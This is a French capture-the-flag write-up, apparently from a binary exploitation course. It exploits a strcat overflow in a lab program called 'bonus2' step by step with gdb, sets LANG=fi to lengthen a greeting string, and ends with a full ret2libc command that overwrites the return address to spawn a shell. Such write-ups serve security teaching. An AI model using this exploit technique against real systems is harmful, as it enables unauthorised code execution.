# Ret2libc Exploitation

En décompilant l'exécutable, on remarque que le programme prend 2 arguments. En explorant le code du programme, on remarque qu'il n'y a pas d'appel `system` pour lancer un `shell`. Il semblerait donc que nous allons devoir effectuer une redirection d'adresse pour lancer notre propre `shell`. On remarque également des appels aux fonctions `strncpy`, `memcmp`. Seulement, ces fonctions ne semblent pas exploitables pour écraser une adresse. En revanche, le programme fait appel à `strcat` dans la fonction `greetuser` et semble concaténer un de nos arguments. Nous pouvons donc supposer qu'un exploit est possible ici. Plus précisement, nous pourrions utiliser cet appel à `strcat` pour écraser l'adresse de retour de la fonction `greetuser`.

Vérifions cette hypothèses. Intéressons-nous d'abord aux `strcpy` dans la fonction `main`. Ceux-ci copient nos arguments à un emplacement mémoire.
```c
pcStack172 = envp[1];
uStack168 = 0x28;
strncpy();
pcStack172 = envp[2];
uStack168 = 0x20;
strncpy();
```
Le premier `strcpy` copie `0x28` (`40` en base 10) octets du premier argument en mémoire. Le second copie `0x20` (`32` en base 10) octets du second argument. Observons l'endroit où ils sont copiés. Remplissons ces emplacements et imprimons la mémoire après l'appel du second `strcpy`.
```
> gdb bonus2
[...]
> (gdb) disas main
[...]
   0x08048574 <+75>:	mov    %eax,(%esp)
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    0xc(%ebp),%eax
   0x0804857f <+86>:	add    $0x8,%eax
   0x08048582 <+89>:	mov    (%eax),%eax
   0x08048584 <+91>:	movl   $0x20,0x8(%esp)
   0x0804858c <+99>:	mov    %eax,0x4(%esp)
   0x08048590 <+103>:	lea    0x50(%esp),%eax
   0x08048594 <+107>:	add    $0x28,%eax
   0x08048597 <+110>:	mov    %eax,(%esp)
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	movl   $0x8048738,(%esp)
[...]
> (gdb) b *0x0804859f
Breakpoint 1 at 0x804859f
> (gdb) set args `python -c 'print "A"*40'` `python -c 'print "B"*32'`
> (gdb) r
Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*32'`

Breakpoint 1, 0x0804859f in main ()
> (gdb) x/50wx $esp
0xbffff630:	0xbffff6a8	0xbffff8e3	0x00000020	0xb7fff918
                        ^
                        adresse de copie du
                        second argument
0xbffff640:	0x00000000	0x00000000	0x00000000	0xb7fd0ff4
0xbffff650:	0xbffff69e	0xbffff69f	0x00000001	0xb7ec3c49
0xbffff660:	0xbffff69f	0xbffff69e	0x00000000	0xb7ff3fec
0xbffff670:	0xbffff724	0x00000000	0x00000000	0xb7e5ec73
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
            ^
            premier argument
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0x41414141	0x41414141	0x42424242	0x42424242
                                    ^
                                    second argument
0xbffff6b0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff6c0:	0x42424242	0x42424242	0x00000000	0xb7e5ee55
0xbffff6d0:	0xb7fed280	0x00000000	0x08048649	0xb7fd0ff4
0xbffff6e0:	0x00000000	0x00000000	0x00000000	0xb7e454d3
0xbffff6f0:	0x00000003	0xbffff784
```
On remarque en imprimant la `stack`, que nos deux arguments sont copiés à la suite. Cela semble idéal pour exploiter `strcat` et passer outre la limite de copie de nos arguments imposée par les `strncpy`.

Observons ensuite la mémoire après l'appel à `strcat`.
```
> (gdb) disas greetuser
[...]
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax
   0x08048514 <+144>:	mov    %eax,(%esp)
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax
   0x0804851f <+155>:	mov    %eax,(%esp)
[...]
> (gdb) b *0x0804851c
Breakpoint 2 at 0x804851c
> (gdb) c
Continuing.

Breakpoint 2, 0x0804851c in greetuser ()
```
Observons au préalable la fonction `greetuser`. On peut y observer `3` conditions sur la variable statique `_language`.
```c
if (_language == 1) {
    s1 = "Hyvää päivää "._0_4_;
    uStack72 = "Hyvää päivää "._4_4_;
    uStack68 = "Hyvää päivää "._8_4_;
    uStack64 = "Hyvää päivää "._12_4_;
    uStack60 = "Hyvää päivää "._16_2_;
    cStack58 = "Hyvää päivää "[18];
} else {
    if (_language == 2) {
        s1 = "Goedemiddag! "._0_4_;
        uStack72 = "Goedemiddag! "._4_4_;
        uStack68 = "Goedemiddag! "._8_4_;
        uStack64 = uStack64 & 0xffff0000 | (uint32_t)"Goedemiddag! "._12_2_;
    } else {
        if (_language == 0) {
            s1 = "Hello "._0_4_;
            uStack72._0_3_ = CONCAT12("Hello "[6], "Hello "._4_2_);
            uStack72 = uStack72 & 0xff000000 | (uint32_t)(unkuint3)uStack72;
        }
    }
}
strcat(&s1, &arg_8h);
```

Actuellement, nous ne savons pas dans quelle condition notre programme s'est exécuté. Nénamoins, nous allons pouvoir le vérifier en imprimant la `stack`.

```
> (gdb) x/50wx $esp
0xbffff5d0:	0xbffff5e0	0xbffff630	0x00000001	0x00000000
            ^           ^
            adresse de  adresse de copie
            copie du    du premier strcpy
            strcat
0xbffff5e0:	0x6c6c6548	0x4141206f	0x41414141	0x41414141
            ^
            Concaténation de "Hello " et
            du premier argument.
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff600:	0x41414141	0x41414141	0x41414141	0x42424141
0xbffff610:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff620:	0x42424242	0x42424242	0x42424242	0x08004242
                                                ^
                                                adresse de retour
                                                de greetuser
0xbffff630:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff650:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffff660:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff670:	0x42424242	0x42424242	0x00000000	0xb7e5ec73
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141
```
En observant la zone de concaténation de `strcat`, on remarque qu'il a concaténé la chaîne `Hello` ainsi que notre premier argument. On y observe aussi notre second argument. En effet, on se rappelle que nos 2 arguments sont copiés à la suite dans la mémoire. Le premier argument n'est pas terminé par un `\0`. En parcourant notre premier argument, `strcat` va donc y inclure notre second argument, comme nous l'avions imaginé précédement.

`eip` étant stocké dans `ebp+0x04`, nous pouvons l'imprimer avec `gdb`.
```
x $ebp+0x04
0xbffff62c:	0x08004242
```
On remarque que `eip` a été en partie écrasée grâce au `strcat`.

Nous avons vérifié factuellement nos indications sur la `stack`.

D'après nos tests, nous sommes limités sur la quantité d'octets concaténée via nos arguments. En revanche, nous avons profité de la chaîne de caractère `Hello` pour écrire plus loin en mémoire. Une chaîne de caractère plus grande semblerait intéressante à utiliser pour écrire encore plus loin et ainsi écraser la valeur de `eip`. Le première condition semble intéressante. Elle contient en effet une chaîne de caractère plus grande que `Hello`.
```c
if (_language == 1) {
    s1 = "Hyvää päivää "._0_4_;
    uStack72 = "Hyvää päivää "._4_4_;
    uStack68 = "Hyvää päivää "._8_4_;
    uStack64 = "Hyvää päivää "._12_4_;
    uStack60 = "Hyvää päivää "._16_2_;
    cStack58 = "Hyvää päivää "[18];
}
```
La chaîne `Hyvää päivää` pourrait nous aider à atteindre l'adresse stockée dans le registre pointé par `eip`. Pour cela, la variable statique `_language` doit être égale à `1`. Nous remarquons que sa valeur est attribuée dans la fonction `main`.
```c
if (pcVar2 != (char *)0x0) {
    uStack168 = 2;
    pcStack172 = (char *)0x804873d;
    iVar3 = memcmp();
    if (iVar3 == 0) {
        _language = 1;
        arg_8h = pcVar2;
    } else {
        uStack168 = 2;
        pcStack172 = (char *)0x8048740;
        arg_8h = pcStack20;
        iVar3 = memcmp();
        if (iVar3 == 0) {
            _language = 2;
        }
    }
}
```
Dans `gdb`, il serait intéressant de voir à quoi correspond la chaine de caractères contenue à l'adresse `0x804873d`. On `break` juste avant l'appel au premier `memcmp`.
```
> (gdb) disas main
[...]
   0x080485d3 <+170>:	mov    %eax,(%esp)
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   %eax,%eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	movl   $0x1,0x8049988
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:	mov    0x9c(%esp),%eax
   0x08048602 <+217>:	mov    %eax,(%esp)
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   %eax,%eax
[...]
> (gdb) b *0x080485d6
Breakpoint 3 at 0x80485d6
> (gdb) r
[...]
Breakpoint 3, 0x080485d6 in main ()
> (gdb) x/3wx $esp
0xbffff630:	0xbfffff22	0x0804873d	0x00000002
                                    ^
                                    octets comparés
```
Ci dessus, on imprime les 3 arguments de `memcmp`. Ici, `memcmp` ne compare que `2` octets. On peut ensuite imprimer les deux valeurs comparées par la fonction.
```
(gdb) x 0xbfffff22
0xbfffff22:	0x555f6e65
(gdb) x 0x0804873d
0x804873d:	0x6e006966
```
En convertissant le contenu de ces deux adresses en chaîne de caractères, on obtient ceci :
```
arg_1 = en_U?
arg_2 = fi�n?
```
`en_U` ressemble à un langage. En regardant plus haut dans la fonction `main`, on y remarque un appel à la fonction `getenv` avec comme argument `LANG`.
```c
arg_8h = "LANG";
pcVar2 = (char *)getenv();
```
Pour résumer, `memcmp` compare 2 octets de notre variables d'environnement `LANG` à la chaîne `fi�n?`. En modifiant notre variable d'envionnement `LANG`, nous serions capable de passer la valeur de `_language` à `1` et ainsi utiliser la chaîne de caractère `Hyvää päivää ` lors de notre appel à `strcat`.

Puisque `memcmp` ne compare que 2 octets, il suffit simplement de changer notre variable d'environnement `LANG` à `fi`.
```
> export LANG=fi
```
Sans changer nos arguments, imprimons à nouveau la `stack` après `strcat` pour vérifier que `_language` a été modifié correctement.
```
x/50wx $esp
0xbffff5d0:	0xbffff5e0	0xbffff630	0x00000001	0x00000000
            ^           ^
            adresse de  adresse de copie
            copie du    du premier strcpy
            strcat
0xbffff5e0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
            ^
            Concaténation de "Hyvää päivää " et
            du premier argument.
0xbffff5f0:	0x414120a4	0x41414141	0x41414141	0x41414141
0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff610:	0x41414141	0x41414141	0x42424141	0x42424242
0xbffff620:	0x42424242	0x42424242	0x42424242	0x42424242
                                                ^
                                                adresse de retour
                                                de greetuser
0xbffff630:	0x42424242	0x42424242	0x41004242	0x41414141
0xbffff640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff650:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffff660:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff670:	0x42424242	0x42424242	0x00000000	0xb7e5ec73
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141
```
On remarque que c'est à présent la chaîne `Hyvää päivää ` qui est utilisé pour notre concaténation.

> On ne dénombre visuellement que `13` caractères dans la chaîne `Hyvää päivää ` alors qu'on en observe `18` en imprimant la `stack`. C'est parce que les caractères `ä` sont des caractères Unicode qui ont une taille de `2` octets au lieu de `1`.

On peut également remarquer que `eip` a été completement écrasée.

Pour lancer un `shell`, nous allons utiliser la faille `Ret2libc` qui nous évite de stocker un `shell code` en mémoire. Nous aurons donc besoin au préalable de connaître l'adresse de la fonction `system` ainsi que de `"/bin/sh"`.

---

**Adresse de `system`**
```
> (gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
L'adresse de `system` est `0xb7e6b060`.

**Adresse de `"/bin/sh"`**
```
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```
L'adresse de `"/bin/sh"` est `0xb7f8cc58`.

---

Il nous faut ensuite calculer la taille de nos argument pour pouvoir placer correctement nos adresse sur `eip`. De manière abstraite, on peut représenter notre concaténation de cette manière :
```
Début du buffer                                     eip
v                                                   v
[Hyvää päivää] [premier_argument] [second_argument] [adresse_system] [adresse_retour] [adresse_bin_sh]
^              ^                                    ^                ^                ^
18 octets      40 octets                            4 octets         4 octets         4 octets
               (obligatoirement)
```
La taille de notre second argument se résume donc à ce calcul :
```
taille_second_argument = adresse_eip - adresse_buffer - (taille_Hyvää + taille_premier_argument)
                       = 0xbffff62c - 0xbffff5e0 - (0x12 + 0x28)
                       = 0x12
                       = 18 (base 10)
```
Notre second argument devra donc faire `18` octets. Finalement, nous utilisons donc cette commande :
```
./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*18 + "\xb7\xe6\xb0\x60"[::-1] + "OSEF" + "\xb7\xf8\xcc\x58"[::-1]'`
```
